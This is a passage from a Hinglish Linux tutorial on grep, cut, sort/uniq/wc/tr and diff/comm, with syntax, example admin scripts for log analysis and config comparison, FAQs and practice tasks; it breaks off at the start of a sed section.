        "try:|except|trap|set -e" "$PROJECT_DIR" \
        --exclude-dir=".git" \
        2>/dev/null | head -50
}

# Search in logs with context
search_logs() {
    local pattern=$1
    local log_dir="/var/log"
    
    echo -e "${YELLOW}=== Log Search: $pattern ===${NC}"
    
    # Search with context
    grep -rn -C 3 -E --include="*.log" \
        "$pattern" "$log_dir" \
        2>/dev/null | head -100
}

# Find files with multiple patterns
search_multiple_patterns() {
    echo -e "${GREEN}=== Files with Multiple Patterns ===${NC}"
    
    # Find files containing both "error" AND "database"
    grep -rl -E "error" "$PROJECT_DIR" --include="*.log" | \
        xargs grep -l "database" 2>/dev/null || echo "None found"
}

# Search with file type filtering
search_by_filetype() {
    local pattern=$1
    local filetype=$2
    
    echo "Searching for '$pattern' in *.$filetype files..."
    
    grep -rn -E --include="*.$filetype" \
        --exclude-dir="node_modules" \
        --exclude-dir=".git" \
        --exclude-dir="vendor" \
        "$pattern" "$PROJECT_DIR"
}

# Main menu
main() {
    if [ -z "$SEARCH_PATTERN" ]; then
        echo "Choose search type:"
        echo "1. Security issues"
        echo "2. TODOs/FIXMEs"
        echo "3. Error handling"
        echo "4. Custom pattern"
        read -p "Enter choice: " choice
        
        case $choice in
            1) search_security_issues ;;
            2) search_todos ;;
            3) search_error_handling ;;
            4) 
                read -p "Enter pattern: " pattern
                grep -rn -C 2 -E "$pattern" "$PROJECT_DIR" \
                    --exclude-dir="node_modules" \
                    --exclude-dir=".git"
                ;;
            *) usage ;;
        esac
    else
        # Direct search
        grep -rn -C 2 -E "$SEARCH_PATTERN" "$PROJECT_DIR" \
            --exclude-dir="node_modules" \
            --exclude-dir=".git" \
            --color=always
    fi
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`-E` bhoolna:** Complex regex ke liye zaroori
- ❌ **Recursive without exclude:** node_modules, .git search karna
- ❌ **Context overuse:** `-C 100` bahut zyada hai

### 10. **Best Practices / Pro Tips**
- 💡 **`-E` for OR:** `grep -E "pat1|pat2"` simple hai
- 💡 **Always exclude:** `--exclude-dir=".git"` use karo
- 💡 **Context wisely:** `-C 3` usually enough
- 💡 **Combine options:** `-rn -E --include` powerful combo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Production incident investigation tool

set -euo pipefail

readonly LOG_DIR="/var/log"
readonly APP_LOG="$LOG_DIR/app/application.log"
readonly ERROR_LOG="$LOG_DIR/app/error.log"

investigate_incident() {
    local incident_time=$1  # Format: "2024-01-15 14:30"
    
    echo "=== Investigating Incident at $incident_time ==="
    
    # Find errors around incident time with context
    echo "Errors around incident time:"
    grep -E "$incident_time" "$ERROR_LOG" -C 10 | \
        grep -E "ERROR|FATAL|Exception" --color=always
    
    echo ""
    echo "=== Related Application Logs ==="
    
    # Search recursively in all app logs
    grep -r -E "$incident_time" "$LOG_DIR/app/" \
        --include="*.log" \
        -A 5 -B 5 \
        --exclude="*debug*"
    
    echo ""
    echo "=== Database Errors ==="
    
    # Find database-related errors
    grep -r -E "database|connection|timeout" "$LOG_DIR/app/" \
        --include="*.log" \
        -C 3 | \
        grep -E "$incident_time" -A 3 -B 3
    
    echo ""
    echo "=== API Failures ==="
    
    # Find API call failures
    grep -r -E "HTTP.*[45][0-9]{2}" "$LOG_DIR/app/" \
        --include="*.log" | \
        grep -E "$incident_time" -C 2
}

# Search for specific error patterns
search_error_patterns() {
    echo "=== Common Error Patterns ==="
    
    # Multiple patterns with extended regex
    grep -r -E -n \
        "OutOfMemory|StackOverflow|NullPointer|Connection.*refused|Timeout" \
        "$LOG_DIR/app/" \
        --include="*.log" \
        --exclude-dir="archive" \
        -C 2 | \
        tail -50
}

# Find all occurrences of a user's activity
trace_user_activity() {
    local user_id=$1
    
    echo "=== Tracing User Activity: $user_id ==="
    
    grep -r -E "user[_-]?id[=:]?\s*$user_id" "$LOG_DIR/" \
        --include="*.log" \
        -n -C 3 \
        --exclude-dir="archive" | \
        head -100
}

investigate_incident "2024-01-15 14:30"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `-E` extended regex (OR, +, etc.)
- ✅ `-r` recursive search
- ✅ `-A`/`-B`/`-C` context lines
- ✅ `--include` file filtering
- ✅ `--exclude-dir` skip directories

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `-E` aur basic grep mein kya fark hai?**
A: `-E` extended regex support karta hai: `|`, `+`, `?`, `{}`

**Q2: Recursive search slow hai, kaise fast karu?**
A: `--exclude-dir` use karo unwanted directories skip karne ke liye.

**Q3: Context lines kab use karu?**
A: Jab surrounding information chahiye - errors ke liye useful.

### 14. **Practice ke liye Task**

```bash
# 1. Extended regex (OR)
grep -E "error|warning" app.log

# 2. Recursive search
grep -r "function" /home/user/scripts/

# 3. Context after
grep -A 3 "Exception" error.log

# 4. Context before
grep -B 2 "FATAL" app.log

# 5. Include specific files
grep -r --include="*.sh" "TODO" .

# 6. Exclude directories
grep -r --exclude-dir="node_modules" "import" .

# 7. Combined
grep -rn -E -C 2 --include="*.py" "def.*main" .
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔧 `-E` for extended regex (powerful)
- 📁 `-r` recursive directory search
- 📋 `-A`/`-B`/`-C` show context
- 🎯 `--include`/`--exclude` file filtering
- 🚀 Essential for codebase search

> **💡 Ye Zaroor Yaad Rakhein:**
> Advanced grep production debugging ka secret weapon! `-E` for complex patterns, `-r` for directories, context options for understanding. Hamesha `.git` aur `node_modules` exclude karo!

---

## **Topic 3: `cut` (by character `-c`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**cut** - Text se specific columns ya characters extract karna.

### 2. **Ye Kya Hai? (What is it?)**
`cut` command text lines se specific portions extract karta hai - characters by position (`-c`), fields by delimiter (`-f`), ya bytes (`-b`). CSV files, logs, aur structured data process karne ke liye perfect.

**Analogy:** cut ek paper cutter hai jo document ke specific columns ko precisely cut kar deta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Data extraction** - Specific columns nikalna
- ✅ **CSV processing** - Delimited files handle
- ✅ **Log parsing** - Structured logs se data
- ✅ **Fast & simple** - Quick text manipulation

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- CSV/TSV files process karna
- Log files se specific fields
- Fixed-width data extract
- Column-based data manipulation

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manual text extraction
- Complex awk/sed scripts
- Time waste
- Error-prone parsing

### 6. **Syntax aur Common Options**

```bash
# By character position
cut -c 1-5 file.txt          # Characters 1 to 5
cut -c 1,3,5 file.txt        # Characters 1, 3, 5
cut -c 5- file.txt           # From character 5 to end

# By field (delimiter)
cut -d ',' -f 1 file.csv     # First field (comma delimiter)
cut -d ':' -f 1,3 /etc/passwd # Fields 1 and 3
cut -d ' ' -f 2- file.txt    # From field 2 to end
```

### 7. **Example 1 (Basic)**

```bash
# Extract first 10 characters
echo "Hello World!" | cut -c 1-10
# Output: Hello Worl

# Extract specific characters
echo "ABCDEFGH" | cut -c 1,3,5,7
# Output: ACEG

# CSV - extract first column
echo "John,25,Engineer" | cut -d ',' -f 1
# Output: John

# Multiple fields
echo "John:x:1000:1000:John Doe:/home/john:/bin/bash" | cut -d ':' -f 1,5
# Output: John:John Doe

# From /etc/passwd - get usernames
cut -d ':' -f 1 /etc/passwd
# Output: root
#         daemon
#         bin
#         ...
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# CSV data processor using cut

set -euo pipefail

readonly CSV_FILE="${1:-data.csv}"

# Extract specific columns from CSV
extract_columns() {
    local file=$1
    
    echo "=== Extracting Name and Email ==="
    # Assuming CSV: Name,Age,Email,City
    cut -d ',' -f 1,3 "$file"
}

# Process log file
parse_apache_log() {
    local log="/var/log/apache2/access.log"
    
    echo "=== Top 10 IPs ==="
    # Extract IP (first field)
    cut -d ' ' -f 1 "$log" | sort | uniq -c | sort -rn | head -10
    
    echo ""
    echo "=== Request Methods ==="
    # Extract method (6th field after quote)
    cut -d '"' -f 2 "$log" | cut -d ' ' -f 1 | sort | uniq -c
}

# Extract date from log
extract_dates() {
    local log=$1
    
    # Extract date portion (characters 2-11 from timestamp)
    grep "2024" "$log" | cut -c 2-11 | sort | uniq -c
}

# Process /etc/passwd
analyze_users() {
    echo "=== System Users ==="
    
    # Username and home directory
    cut -d ':' -f 1,6 /etc/passwd | head -10
    
    echo ""
    echo "=== Users with bash shell ==="
    grep "/bash$" /etc/passwd | cut -d ':' -f 1
}

# CSV to specific format
csv_to_custom() {
    local csv=$1
    
    # Input: Name,Age,City
    # Output: Name is Age years old from City
    
    while IFS=',' read -r name age city; do
        echo "$name is $age years old from $city"
    done < <(tail -n +2 "$csv")  # Skip header
}

main() {
    if [ -f "$CSV_FILE" ]; then
        extract_columns "$CSV_FILE"
    else
        echo "File not found, running system analysis..."
        analyze_users
    fi
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Delimiter specify nahi karna:** Default space/tab hai
- ❌ **Field numbers galat:** 1-indexed hai, 0 nahi
- ❌ **Multiple delimiters:** cut ek hi delimiter handle karta hai

### 10. **Best Practices / Pro Tips**
- 💡 **`-d` specify karo:** Delimiter hamesha clear rakho
- 💡 **Ranges use karo:** `1-5` instead of `1,2,3,4,5`
- 💡 **Combine with other tools:** `cut | sort | uniq`
- 💡 **For complex parsing:** awk better hai

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# System monitoring report generator

generate_report() {
    echo "=== System Monitoring Report ==="
    echo "Generated: $(date)"
    echo ""
    
    # Disk usage - extract filesystem and usage
    echo "=== Disk Usage ==="
    df -h | tail -n +2 | while read line; do
        filesystem=$(echo "$line" | cut -d ' ' -f 1)
        usage=$(echo "$line" | awk '{print $(NF-1)}')
        echo "$filesystem: $usage"
    done
    
    echo ""
    echo "=== Top 5 Memory Consumers ==="
    ps aux | sort -k 4 -rn | head -6 | tail -5 | while read line; do
        user=$(echo "$line" | cut -d ' ' -f 1)
        mem=$(echo "$line" | awk '{print $4}')
        cmd=$(echo "$line" | awk '{print $11}')
        echo "$user - $cmd: $mem%"
    done
    
    echo ""
    echo "=== Active Users ==="
    who | cut -d ' ' -f 1 | sort | uniq
    
    echo ""
    echo "=== Network Connections ==="
    ss -tuln | grep LISTEN | while read line; do
        port=$(echo "$line" | awk '{print $5}' | cut -d ':' -f 2)
        echo "Port: $port"
    done | sort -u
}

generate_report
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `cut -c` for characters
- ✅ `cut -d -f` for fields
- ✅ `-d` specify delimiter
- ✅ Ranges: `1-5`, `3-`
- ✅ Great for CSV/logs

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Multiple delimiters kaise handle karu?**
A: `tr` se pehle normalize karo ya awk use karo.

**Q2: Last field kaise extract karu?**
A: `rev | cut -d ',' -f 1 | rev` ya awk use karo.

**Q3: cut vs awk?**
A: cut simple aur fast, awk powerful aur flexible.

### 14. **Practice ke liye Task**

```bash
# 1. Characters
echo "Hello World" | cut -c 1-5

# 2. CSV field
echo "John,25,NYC" | cut -d ',' -f 1

# 3. Multiple fields
echo "a:b:c:d:e" | cut -d ':' -f 1,3,5

# 4. From file
cut -d ':' -f 1 /etc/passwd | head -5

# 5. Range
echo "ABCDEFGH" | cut -c 3-

# 6. Combine
cat data.csv | cut -d ',' -f 2 | sort | uniq
```

### 15. **Aakhri Choti Summary (5 lines)**
- ✂️ cut extracts columns/characters
- 📊 `-c` for character positions
- 🔤 `-d -f` for delimited fields
- 📁 Perfect for CSV/logs
- ⚡ Fast and simple

> **💡 Ye Zaroor Yaad Rakhein:**
> cut simple aur fast hai! CSV ke liye `-d ',' -f`, characters ke liye `-c`. Complex parsing ke liye awk use karo. Pipes ke saath powerful!

---

## **Topic 4: `sort`, `uniq`, `wc`, `tr`**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Text Utilities** - Sorting, deduplication, counting, aur transformation.

### 2. **Ye Kya Hai? (What is it?)**
Yeh char powerful text processing tools hain: `sort` lines ko sort karta hai, `uniq` duplicates remove karta hai, `wc` words/lines/characters count karta hai, `tr` characters translate/delete karta hai.

**Analogy:** sort ek librarian hai (books arrange), uniq ek filter (duplicates remove), wc ek counter (count everything), tr ek translator (characters change).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Data organization** - Sorted output
- ✅ **Deduplication** - Unique values
- ✅ **Statistics** - Counts and metrics
- ✅ **Transformation** - Character manipulation

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Data sorting aur analysis
- Duplicate removal
- File statistics
- Case conversion, character replacement

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Unsorted data
- Duplicate entries
- Manual counting
- Complex string manipulation

### 6. **Syntax aur Common Options**

```bash
# sort
sort file.txt              # Alphabetical
sort -n file.txt           # Numeric
sort -r file.txt           # Reverse
sort -k 2 file.txt         # By column 2
sort -u file.txt           # Sort + unique

# uniq
uniq file.txt              # Remove adjacent duplicates
uniq -c file.txt           # Count occurrences
uniq -d file.txt           # Only duplicates
uniq -u file.txt           # Only unique

# wc
wc file.txt                # Lines, words, bytes
wc -l file.txt             # Lines only
wc -w file.txt             # Words only
wc -c file.txt             # Bytes

# tr
tr 'a-z' 'A-Z'             # Lowercase to uppercase
tr -d 'aeiou'              # Delete vowels
tr -s ' '                  # Squeeze spaces
```

### 7. **Example 1 (Basic)**

```bash
# sort examples
echo -e "banana\napple\ncherry" | sort
# Output: apple, banana, cherry

sort -n numbers.txt        # Numeric sort
sort -r file.txt           # Reverse order
sort -k 2 data.txt         # Sort by 2nd column

# uniq examples
echo -e "apple\napple\nbanana\napple" | sort | uniq
# Output: apple, banana

echo -e "a\na\nb\nb\nb" | sort | uniq -c
# Output: 2 a
#         3 b

# wc examples
wc file.txt
# Output: 10  50  300 file.txt (lines words bytes)

wc -l *.txt                # Count lines in all .txt
echo "Hello World" | wc -w # Count words: 2

# tr examples
echo "hello" | tr 'a-z' 'A-Z'
# Output: HELLO

echo "a1b2c3" | tr -d '0-9'
# Output: abc

echo "hello    world" | tr -s ' '
# Output: hello world
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Log analysis using text utilities

set -euo pipefail

readonly LOG_FILE="/var/log/app.log"

# Top 10 most frequent errors
top_errors() {
    echo "=== Top 10 Errors ==="
    
    grep -i "error" "$LOG_FILE" | \
        cut -d ':' -f 3- | \
        sort | \
        uniq -c | \
        sort -rn | \
        head -10
}

# Count log levels
count_log_levels() {
    echo "=== Log Level Statistics ==="
    
    grep -oE "INFO|WARN|ERROR|DEBUG" "$LOG_FILE" | \
        sort | \
        uniq -c | \
        sort -rn
}

# Top IPs by request count
top_ips() {
    local access_log="/var/log/nginx/access.log"
    
    echo "=== Top 10 IPs ==="
    
    cut -d ' ' -f 1 "$access_log" | \
        sort | \
        uniq -c | \
        sort -rn | \
        head -10
}

# File statistics
file_stats() {
    local dir=${1:-.}
    
    echo "=== File Statistics for $dir ==="
    
    find "$dir" -type f -name "*.sh" | while read file; do
        lines=$(wc -l < "$file")
        words=$(wc -w < "$file")
        echo "$file: $lines lines, $words words"
    done | sort -t ':' -k 2 -rn
}

# Clean and normalize data
clean_data() {
    local input=$1
    
    # Convert to lowercase, remove special chars, squeeze spaces
    cat "$input" | \
        tr 'A-Z' 'a-z' | \
        tr -cd 'a-z0-9 \n' | \
        tr -s ' ' | \
        sort | \
        uniq
}

# Word frequency analysis
word_frequency() {
    local file=$1
    
    echo "=== Top 20 Words ==="
    
    cat "$file" | \
        tr 'A-Z' 'a-z' | \
        tr -cs 'a-z' '\n' | \
        sort | \
        uniq -c | \
        sort -rn | \
        head -20
}

# Find duplicate lines
find_duplicates() {
    local file=$1
    
    echo "=== Duplicate Lines ==="
    
    sort "$file" | uniq -d
    
    echo ""
    echo "=== Duplicate Count ==="
    
    sort "$file" | uniq -cd | sort -rn
}

# Compare two files
compare_files() {
    local file1=$1
    local file2=$2
    
    echo "=== Lines only in $file1 ==="
    sort "$file1" "$file2" "$file2" | uniq -u
    
    echo ""
    echo "=== Lines in both files ==="
    sort "$file1" "$file2" | uniq -d
}

# Generate statistics report
generate_stats() {
    echo "=== System Statistics ==="
    echo "Total users: $(wc -l < /etc/passwd)"
    echo "Total groups: $(wc -l < /etc/group)"
    echo "Shell scripts: $(find /usr/local/bin -name "*.sh" | wc -l)"
    echo "Log files: $(find /var/log -name "*.log" | wc -l)"
}

main() {
    top_errors
    echo ""
    count_log_levels
    echo ""
    generate_stats
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **uniq without sort:** uniq sirf adjacent duplicates remove karta hai
- ❌ **Numeric sort bhoolna:** Text sort numbers ke liye galat
- ❌ **tr ranges galat:** `'a-z'` quotes mein hona chahiye

### 10. **Best Practices / Pro Tips**
- 💡 **sort before uniq:** Hamesha pehle sort karo
- 💡 **`sort -u`:** sort + uniq ek saath
- 💡 **`uniq -c`:** Frequency count ke liye
- 💡 **Pipe combination:** `sort | uniq -c | sort -rn`

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Security audit - failed login analysis

readonly AUTH_LOG="/var/log/auth.log"
readonly REPORT="/tmp/security_report.txt"

security_audit() {
    echo "=== Security Audit Report ===" > "$REPORT"
    echo "Generated: $(date)" >> "$REPORT"
    echo "" >> "$REPORT"
    
    # Failed login attempts
    echo "=== Failed Login Attempts ===" >> "$REPORT"
    grep "Failed password" "$AUTH_LOG" | wc -l >> "$REPORT"
    
    echo "" >> "$REPORT"
    echo "=== Top 10 Failed Login IPs ===" >> "$REPORT"
    grep "Failed password" "$AUTH_LOG" | \
        grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | \
        sort | \
        uniq -c | \
        sort -rn | \
        head -10 >> "$REPORT"
    
    echo "" >> "$REPORT"
    echo "=== Targeted Usernames ===" >> "$REPORT"
    grep "Failed password" "$AUTH_LOG" | \
        awk '{print $(NF-5)}' | \
        sort | \
        uniq -c | \
        sort -rn | \
        head -10 >> "$REPORT"
    
    echo "" >> "$REPORT"
    echo "=== Successful Logins ===" >> "$REPORT"
    grep "Accepted password" "$AUTH_LOG" | \
        awk '{print $9}' | \
        sort | \
        uniq -c >> "$REPORT"
    
    cat "$REPORT"
}

security_audit
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `sort` for ordering
- ✅ `uniq` for deduplication
- ✅ `wc` for counting
- ✅ `tr` for transformation
- ✅ Combine with pipes

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: uniq kaam kyun nahi kar raha?**
A: Pehle sort karo, uniq sirf adjacent duplicates remove karta hai.

**Q2: Numbers sort galat ho rahe hain?**
A: `sort -n` use karo numeric sort ke liye.

**Q3: Case-insensitive sort kaise?**
A: `sort -f` use karo.

### 14. **Practice ke liye Task**

```bash
# 1. Sort
echo -e "3\n1\n2" | sort -n

# 2. Unique
echo -e "a\na\nb" | sort | uniq

# 3. Count
echo "hello world" | wc -w

# 4. Uppercase
echo "hello" | tr 'a-z' 'A-Z'

# 5. Frequency
cat file.txt | sort | uniq -c | sort -rn

# 6. Remove duplicates
sort file.txt | uniq > unique.txt

# 7. Delete characters
echo "a1b2c3" | tr -d '0-9'
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📊 sort organizes data
- 🎯 uniq removes duplicates (after sort!)
- 🔢 wc counts lines/words/bytes
- 🔄 tr transforms characters
- 💪 Combine for powerful processing

> **💡 Ye Zaroor Yaad Rakhein:**
> sort + uniq combo bahut powerful! uniq se pehle hamesha sort karo. wc quick stats ke liye. tr case conversion aur cleanup ke liye. Pipes mein combine karo!

---

## **Topic 5: `diff` & `comm` (Comparing files)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**diff & comm** - Files compare karne aur differences find karne ke tools.

### 2. **Ye Kya Hai? (What is it?)**
`diff` do files ke beech line-by-line differences dikhata hai, changes highlight karta hai. `comm` do sorted files compare karta hai aur common/unique lines show karta hai. Dono file comparison ke liye essential hain.

**Analogy:** diff ek proofreader hai jo two versions compare karta hai, comm ek Venn diagram hai jo overlaps aur differences show karta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Version control** - Changes track karna
- ✅ **Configuration** - Config files compare
- ✅ **Backup verification** - Files match check
- ✅ **Data analysis** - Dataset comparison

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Code changes review
- Config file comparison
- Backup verification
- Data reconciliation

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manual comparison (error-prone)
- Missed changes
- Configuration drift
- Data inconsistencies

### 6. **Syntax aur Common Options**

```bash
# diff
diff file1.txt file2.txt
diff -u file1 file2          # Unified format
diff -y file1 file2          # Side-by-side
diff -r dir1 dir2            # Recursive (directories)
diff -q file1 file2          # Brief (only if different)

# comm
comm file1.txt file2.txt     # 3 columns output
comm -12 file1 file2         # Only common lines
comm -23 file1 file2         # Only in file1
comm -13 file1 file2         # Only in file2
```

### 7. **Example 1 (Basic)**

```bash
# diff basic
diff file1.txt file2.txt
# Output: 
# 2c2
# < old line
# ---
# > new line

# Unified diff (like git)
diff -u old.txt new.txt
# Output:
# --- old.txt
# +++ new.txt
# @@ -1,3 +1,3 @@
#  line1
# -old line
# +new line
#  line3

# Side-by-side
diff -y file1.txt file2.txt

# Brief check
diff -q file1.txt file2.txt
# Output: Files file1.txt and file2.txt differ

# comm examples (files must be sorted!)
comm file1.txt file2.txt
# Column 1: Only in file1
# Column 2: Only in file2
# Column 3: In both

# Only common lines
comm -12 sorted1.txt sorted2.txt

# Only in first file
comm -23 sorted1.txt sorted2.txt
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Configuration management and comparison tool

set -euo pipefail

# Compare configuration files
compare_configs() {
    local prod_config="/etc/app/prod.conf"
    local staging_config="/etc/app/staging.conf"
    
    echo "=== Configuration Differences ==="
    
    if diff -q "$prod_config" "$staging_config" >/dev/null; then
        echo "✓ Configurations are identical"
    else
        echo "⚠️  Configurations differ:"
        echo ""
        diff -u "$prod_config" "$staging_config" | \
            grep -E "^[\+\-]" | \
            grep -v "^[\+\-][\+\-][\+\-]"
    fi
}

# Compare directory structures
compare_directories() {
    local dir1=$1
    local dir2=$2
    
    echo "=== Directory Comparison ==="
    
    # Files only in dir1
    echo "Only in $dir1:"
    comm -23 \
        <(find "$dir1" -type f | sort) \
        <(find "$dir2" -type f | sort)
    
    echo ""
    echo "Only in $dir2:"
    comm -13 \
        <(find "$dir1" -type f | sort) \
        <(find "$dir2" -type f | sort)
    
    echo ""
    echo "Common files:"
    comm -12 \
        <(find "$dir1" -type f | sort) \
        <(find "$dir2" -type f | sort)
}

# Verify backup
verify_backup() {
    local source=$1
    local backup=$2
    
    echo "=== Backup Verification ==="
    
    diff -rq "$source" "$backup" | while read line; do
        if echo "$line" | grep -q "differ"; then
            echo "⚠️  $line"
        elif echo "$line" | grep -q "Only in"; then
            echo "⚠️  $line"
        fi
    done
    
    if [ $? -eq 0 ]; then
        echo "✓ Backup verified successfully"
    else
        echo "✗ Backup verification failed"
    fi
}

# Compare user lists
compare_users() {
    local server1=$1
    local server2=$2
    
    echo "=== User Comparison ==="
    
    # Get user lists
    ssh "$server1" "cut -d: -f1 /etc/passwd | sort" > /tmp/users1.txt
    ssh "$server2" "cut -d: -f1 /etc/passwd | sort" > /tmp/users2.txt
    
    echo "Users only on $server1:"
    comm -23 /tmp/users1.txt /tmp/users2.txt
    
    echo ""
    echo "Users only on $server2:"
    comm -13 /tmp/users1.txt /tmp/users2.txt
    
    echo ""
    echo "Common users:"
    comm -12 /tmp/users1.txt /tmp/users2.txt | wc -l
    
    rm -f /tmp/users1.txt /tmp/users2.txt
}

# Generate diff report
generate_diff_report() {
    local old_version=$1
    local new_version=$2
    local report="/tmp/diff_report.html"
    
    echo "<html><body>" > "$report"
    echo "<h1>Version Comparison Report</h1>" >> "$report"
    echo "<pre>" >> "$report"
    
    diff -u "$old_version" "$new_version" | \
        sed 's/</\&lt;/g; s/>/\&gt;/g' >> "$report"
    
    echo "</pre></body></html>" >> "$report"
    
    echo "Report generated: $report"
}

# Compare package lists
compare_packages() {
    echo "=== Package Comparison ==="
    
    # Current packages
    dpkg -l | awk '{print $2}' | sort > /tmp/current_packages.txt
    
    # Expected packages (from baseline)
    if [ -f "/etc/baseline_packages.txt" ]; then
        sort /etc/baseline_packages.txt > /tmp/baseline_packages.txt
        
        echo "Extra packages installed:"
        comm -23 /tmp/current_packages.txt /tmp/baseline_packages.txt
        
        echo ""
        echo "Missing packages:"
        comm -13 /tmp/current_packages.txt /tmp/baseline_packages.txt
    fi
    
    rm -f /tmp/current_packages.txt /tmp/baseline_packages.txt
}

main() {
    compare_configs
    echo ""
    compare_packages
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **comm without sorting:** Files sorted honi chahiye
- ❌ **diff output confusing:** `-u` use karo readable format ke liye
- ❌ **Binary files:** diff text files ke liye hai

### 10. **Best Practices / Pro Tips**
- 💡 **`diff -u`:** Unified format readable hai
- 💡 **`comm` needs sort:** Pehle sort karo
- 💡 **`-q` for quick check:** Sirf different hai ya nahi
- 💡 **Process substitution:** `comm <(cmd1) <(cmd2)`

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Production deployment verification

set -euo pipefail

readonly PROD_DIR="/var/www/prod"
readonly STAGING_DIR="/var/www/staging"
readonly REPORT="/tmp/deployment_verification.txt"

verify_deployment() {
    echo "=== Deployment Verification ===" > "$REPORT"
    echo "Date: $(date)" >> "$REPORT"
    echo "" >> "$REPORT"
    
    # Compare file lists
    echo "=== File Comparison ===" >> "$REPORT"
    
    local prod_files=$(find "$PROD_DIR" -type f | sort)
    local staging_files=$(find "$STAGING_DIR" -type f | sort)
    
    local diff_count=$(diff <(echo "$prod_files") <(echo "$staging_files") | wc -l)
    
    if [ $diff_count -eq 0 ]; then
        echo "✓ File lists match" >> "$REPORT"
    else
        echo "⚠️  File lists differ ($diff_count differences)" >> "$REPORT"
        diff <(echo "$prod_files") <(echo "$staging_files") >> "$REPORT"
    fi
    
    echo "" >> "$REPORT"
    echo "=== Configuration Comparison ===" >> "$REPORT"
    
    # Compare configs
    for config in config.json database.yml app.conf; do
        if [ -f "$PROD_DIR/$config" ] && [ -f "$STAGING_DIR/$config" ]; then
            if diff -q "$PROD_DIR/$config" "$STAGING_DIR/$config" >/dev/null; then
                echo "✓ $config matches" >> "$REPORT"
            else
                echo "⚠️  $config differs:" >> "$REPORT"
                diff -u "$PROD_DIR/$config" "$STAGING_DIR/$config" >> "$REPORT"
            fi
        fi
    done
    
    cat "$REPORT"
}

verify_deployment
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `diff` shows line differences
- ✅ `diff -u` unified format
- ✅ `comm` compares sorted files
- ✅ `comm -12` common lines
- ✅ Sort before using comm

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: diff output samajh nahi aata?**
A: `diff -u` use karo, git-style format readable hai.

**Q2: comm kaam nahi kar raha?**
A: Files sorted honi chahiye: `sort file1 > sorted1`

**Q3: Directories compare kaise karu?**
A: `diff -r dir1 dir2` use karo.

### 14. **Practice ke liye Task**

```bash
# 1. Basic diff
diff file1.txt file2.txt

# 2. Unified diff
diff -u old.txt new.txt

# 3. Quick check
diff -q file1.txt file2.txt

# 4. comm (sort first!)
sort file1.txt > s1.txt
sort file2.txt > s2.txt
comm s1.txt s2.txt

# 5. Common lines only
comm -12 s1.txt s2.txt

# 6. Directory diff
diff -r dir1/ dir2/
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📊 diff shows file differences
- 📝 `-u` for readable format
- 🔄 comm compares sorted files
- ✅ comm -12 for common lines
- 🎯 Essential for version control

> **💡 Ye Zaroor Yaad Rakhein:**
> diff configuration aur code compare ke liye! `-u` readable format. comm sorted files chahiye. Deployment verification mein bahut useful. Process substitution powerful!

---

## **Topic 6: `sed` (Substitute `s/.../.../g`, In-place `-i`, Delete `d`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**sed** - Stream editor for text transformation and manipulation.

### 2. **Ye Kya Hai? (What is it?)**
`sed` (Stream EDitor) ek powerful text processing tool hai jo patterns find aur replace karta hai, lines delete karta hai, aur text transform karta hai. In-place editing (`-i`) files directly modify karti hai.

**Analogy:** sed ek find-and-replace tool hai steroids par - not just replace, but transform, delete, insert bhi kar sakta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Bulk editing** - Multiple files ek saath
- ✅ **Automation** - Scripted text changes
- ✅ **Pattern replacement** - Regex support
- ✅ **In-place editing** - Direct file modification

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Find and replace operations
- Configuration file updates
- Log file processing
- Text transformation

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manual editing (error-prone)
- Time waste on bulk changes
- Inconsistent replacements
- No automation

### 6. **Syntax aur Common Options**

```bash
# Substitute (replace)
sed 's/old/new/' file.txt           # First occurrence
sed 's/old/new/g' file.txt          # All occurrences (global)
sed 's/old/new/2' file.txt          # Second occurrence

# In-place editing
sed -i 's/old/new/g' file.txt       # Modify file directly
sed -i.bak 's/old/new/g' file.txt   # Create backup

# Delete lines
sed '/pattern/d' file.txt           # Delete matching lines
sed '3d' file.txt                   # Delete line 3
sed '1,5d' file.txt                 # Delete lines 1-5

# Print specific lines
